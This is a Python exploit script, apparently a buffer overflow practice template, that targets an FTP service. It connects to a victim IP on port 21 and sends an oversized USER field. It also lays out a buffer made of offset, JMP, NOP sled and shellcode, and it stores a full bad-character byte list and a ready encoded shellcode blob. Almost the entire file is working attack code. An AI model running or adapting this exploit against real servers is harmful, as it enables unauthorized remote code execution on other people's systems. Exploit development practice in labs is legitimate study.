#!/usr/bin/python

import socket
HOST = "" #---> Victim IP Address
PORT = 21 #----> FTP Port
#======================== final buffer setup ========================#

#offset = 
#username = 'A' * offset
#jmp = ''
#nop = '\x90' * 30

#shellcode = 



#buffer = username + jmp + nop + shellcode


#======================= bad charchters check -- Copy the Bad chars from below and paste it under this comment===========#



#=============================================================================#

try:
##=================connecting to service======================================##
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    print s.recv(1024)
##========================Changeable=====================================##
    # sending username #
    username = 'A' * 300
    s.send('USER ' + username + '\r\n')
    print s.recv(1024)

    # sending password
    s.send('PASS ali \r\n')
    print s.recv(1024)
##=========================Error Handling===============================##
except Exception as e:
    # handling Errors
        print ('Error')


##=====================Bad Chars Vault -- Use when needed ==================================##
"""
badchars =
    "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
    "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
    "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
    "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
    "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
    "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
    "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
    "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
    "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
    "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
    "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
    "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
    "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
    "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
    "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
    "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

"""



##=====================Shellcode Vault -- Use when needed ==================================##

"""
shellcode =
"\xba\xcf\xf2\x02\x1d\xda\xd6\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
shellcode +=
"\x56\x31\x56\x13\x83\xee\xfc\x03\x56\xc0\x10\xf7\xe1\x36\x56"
shellcode +=
"\xf8\x19\xc6\x37\x70\xfc\xf7\x77\xe6\x74\xa7\x47\x6c\xd8\x4b"
shellcode +=
"\x23\x20\xc9\xd8\x41\xed\xfe\x69\xef\xcb\x31\x6a\x5c\x2f\x53"
shellcode +=
"\xe8\x9f\x7c\xb3\xd1\x6f\x71\xb2\x16\x8d\x78\xe6\xcf\xd9\x2f"
shellcode +=
"\x17\x64\x97\xf3\x9c\x36\x39\x74\x40\x8e\x38\x55\xd7\x85\x62"
shellcode +=
"\x75\xd9\x4a\x1f\x3c\xc1\x8f\x1a\xf6\x7a\x7b\xd0\x09\xab\xb2"
shellcode +=
"\x19\xa5\x92\x7b\xe8\xb7\xd3\xbb\x13\xc2\x2d\xb8\xae\xd5\xe9"
shellcode +=
"\xc3\x74\x53\xea\x63\xfe\xc3\xd6\x92\xd3\x92\x9d\x98\x98\xd1"
shellcode +=
"\xfa\xbc\x1f\x35\x71\xb8\x94\xb8\x56\x49\xee\x9e\x72\x12\xb4"
shellcode +=
"\xbf\x23\xfe\x1b\xbf\x34\xa1\xc4\x65\x3e\x4f\x10\x14\x1d\x07"
shellcode +=
"\xd5\x15\x9e\xd7\x71\x2d\xed\xe5\xde\x85\x79\x45\x96\x03\x7d"
shellcode +=
"\xdc\xb0\xb3\x51\x66\xd0\x4d\x52\x96\xf8\x89\x06\xc6\x92\x38"
shellcode +=
"\x27\x8d\x62\xc4\xf2\x3b\x69\x52\x3d\x13\x6c\x97\xd5\x61\x6f"
shellcode +=
"\xc6\x78\xec\x89\xb8\xd2\xbe\x05\x79\x83\x7e\xf6\x11\xc9\x71"
shellcode +=
"\x29\x01\xf2\x58\x42\xa8\x1d\x34\x3a\x45\x87\x1d\xb0\xf4\x48"
shellcode +=
"\x88\xbc\x37\xc2\x38\x40\xf9\x23\x49\x52\xee\x53\xb1\xaa\xef"
shellcode +=
"\xf1\xb1\xc0\xeb\x53\xe6\x7c\xf6\x82\xc0\x22\x09\xe1\x53\x24"
shellcode +=
"\xf5\x74\x65\x5e\xc0\xe2\xc9\x08\x2d\xe3\xc9\xc8\x7b\x69\xc9"
shellcode +=
"\xa0\xdb\xc9\x9a\xd5\x23\xc4\x8f\x45\xb6\xe7\xf9\x3a\x11\x80"
shellcode +=
"\x07\x64\x55\x0f\xf8\x43\xe5\x48\x06\x11\xc2\xf0\x6e\xe9\x52"
shellcode +=
"\x01\x6e\x83\x52\x51\x06\x58\x7c\x5e\xe6\xa1\x57\x37\x6e\x2b"
shellcode +=
"\x36\xf5\x0f\x2c\x13\x5b\x91\x2d\x90\x40\x22\x57\xd9\x77\xc3"
shellcode +=
"\xa8\xf3\x13\xc4\xa8\xfb\x25\xf9\x7e\xc2\x53\x3c\x43\x71\x6b"
shellcode +=
"\x0b\xe6\xd0\xe6\x73\xb4\x23\x23"

"""
